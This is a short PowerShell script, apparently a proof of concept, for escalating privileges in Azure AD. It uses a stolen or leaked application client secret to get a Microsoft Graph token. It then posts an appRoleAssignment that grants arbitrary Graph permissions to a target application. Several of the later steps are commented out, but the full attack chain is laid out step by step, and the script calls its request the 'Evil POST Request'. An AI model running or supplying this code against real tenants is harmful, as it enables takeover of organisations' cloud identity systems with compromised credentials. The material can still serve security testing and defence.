# 1. Enter target tenant
$TenantId = '[testID]' # Test Tenant

# 2. Enter target AzureAD Application ApplicationID (under the Enterprise Application blade); Application that HAS AppRoleAssignment.ReadWrite.All (appplication-level)
$ApplicationId = '[AppID]' # TestMegaApp AppID

# 3. Enter the stolen/injected/leaked Client secret associated with the target AzureAD Application (found under the Application Registration blade of the target AzureAD Application)
$ClientSecret = 'passw0rd123'

# 4. Build authenticate body:
$AuthenticationBody = @{
    'tenant' = $TenantId
    'client_id' = $ApplicationId
    'scope' = 'https://graph.microsoft.com/.default'
    'client_secret' = $ClientSecret
    'grant_type' = 'client_credentials'
}
$AuthenticationResponse = Invoke-RestMethod "https://login.microsoftonline.com/$($TenantId)/oauth2/v2.0/token" -Method Post -Body $AuthenticationBody -ContentType 'application/x-www-form-urlencoded'
#$AccessToken = $AuthenticationResponse.access_token
#$Headers = @{'Authorization' = "Bearer $($AccessToken)"}

# 5. Enter target AzureAD Application ObjectID
#$TargetAppObjectId = '[AppObjectID-TestMegaApp]' # TestMegaApp Service Principal ObjectID

# 6. Enter the Azure Graph Aggregator (Azure managed thingy) ObjectID; search for its ApplicationID on AzureAD: 00000003-0000-0000-c000-000000000000
#$TargetAppResourceId = '[MS Graph API Aggregator ObjectID]'

# 7. Enter the ID of the MS Graph API Permission to provision (https://learn.microsoft.com/en-us/graph/permissions-reference#all-permissions-and-ids)
#$MSGraphApiPermissionId = '[Target MS Graph API Permission ID]' 

# 8. Build Evil POST Request body, as per https://learn.microsoft.com/en-gb/graph/api/serviceprincipal-post-approleassignments?view=graph-rest-1.0&tabs=http#request
#$appRole = [ordered]@{
    #'principalId' = $TargetAppObjectId
    #'resourceId'  = $TargetAppResourceId
    #'appRoleId'   = $MSGraphApiPermissionId
  #}

# 9. POST request used for attack vector (https://learn.microsoft.com/en-gb/graph/api/serviceprincipal-post-approleassignments?view=graph-rest-1.0&tabs=http)
#Invoke-RestMethod -Uri "https://graph.microsoft.com/beta/servicePrincipals/AppObjectID-TestMegaApp/appRoleAssignments" -Method Post -Headers $Headers -ContentType 'application/json' -Body ($appRole | ConvertTo-Json) | Out-Null
